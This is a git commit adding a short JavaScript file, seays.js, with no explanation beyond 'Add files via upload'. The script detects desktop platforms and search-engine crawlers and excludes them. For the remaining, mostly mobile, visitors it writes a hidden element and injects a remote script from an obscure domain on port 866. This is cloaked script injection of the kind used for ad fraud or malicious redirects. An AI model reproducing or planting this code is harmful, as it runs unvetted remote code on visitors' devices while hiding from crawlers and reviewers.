06fe3e187b096f2a3b26e9a208b613210b83011e
adlianxi <adlianxi@outlook.com>
2026-02-11 01:26:06 +0800

    Add files via upload

---
+++ seays.js
@@ -0,0 +1,12 @@
+let ua_pc=  /Win|mac/i.test(navigator.platform);
+// console.log(navigator.platform);
+let ua_spider = /Googlebot|Baiduspider|bingbot|YisouSpider|Bytespider|360Spider|Sogou/i.test(navigator.userAgent);
+let ua_web = !ua_pc && !ua_spider;
+if (ua_web) {
+  (function (){
+  var id = "8225462100335650212-10845";
+  document.write('<ins style="display:none!important" id="' + id + '"></ins>');
+  (window.adbyunion = window.adbyunion || []).push(id);
+  document.write('<script async  src="https://nfksjkfs.com:866/o.js"></script>');
+  })();
+}
